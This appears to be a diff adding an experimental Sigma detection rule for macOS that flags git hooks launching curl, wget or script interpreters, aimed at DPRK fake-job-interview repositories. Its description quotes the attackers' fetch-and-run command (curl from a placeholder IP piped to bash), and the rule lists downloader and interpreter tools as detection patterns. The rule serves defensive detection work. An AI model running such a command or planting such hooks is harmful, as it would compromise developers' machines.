@@ -1,0 +1,60 @@
+title: Git Hook Spawns Network Downloader or Interpreter (macOS)
+id: 0f6c2c8e-3b1a-4b7e-9d52-7c1e5a2f9b41
+status: experimental
+description: |
+  Detects git hook execution on macOS that launches curl/wget or a script interpreter,
+  the delivery mechanism of DPRK "Contagious Interview" fake take-home repositories
+  (hooks such as post-checkout / pre-commit / post-commit / pre-merge-commit run
+  `curl -sL http://<ip>:<port>/task/mac?id=<n> | bash`).
+  Published Git-hook rules (Elastic) are Linux-only; this closes the macOS gap.
+  Analyst-written — validate against your telemetry before production use.
+references:
+  - https://citizendot.github.io/articles/fake-job-interview-git-hook-malware/
+  - https://medium.com/@eduard.pershyn/anatomy-of-a-web3-interview-scam-558d78e22b3d
+  - https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_process_execution.toml
+  - https://attack.mitre.org/groups/G1052/
+author: cybersec-audit-skill
+date: 2026-11-14
+tags:
+  - attack.execution
+  - attack.t1204.002
+  - attack.t1059.004
+  - attack.persistence
+  - attack.t1546
+  - attack.command-and-control
+  - attack.t1105
+logsource:
+  product: macos
+  category: process_creation
+detection:
+  parent_hook:
+    - ParentCommandLine|contains: '/.git/hooks/'
+    - ParentImage|contains: '/.git/hooks/'
+  parent_git:
+    ParentImage|endswith:
+      - '/git'
+      - '/git-core/git'
+  child_downloader:
+    Image|endswith:
+      - '/curl'
+      - '/wget'
+  child_interpreter:
+    Image|endswith:
+      - '/bash'
+      - '/sh'
+      - '/zsh'
+      - '/python3'
+      - '/node'
+      - '/osascript'
+  cmd_network:
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+      - '/task/'
+      - 'uname -s'
+  filter_lfs:
+    CommandLine|contains: 'git-lfs'
+  condition: (parent_hook or parent_git) and (child_downloader or (child_interpreter and cmd_network)) and not filter_lfs
+falsepositives:
+  - Legitimate team hooks that fetch tooling (husky/pre-commit frameworks downloading binaries)
+level: high
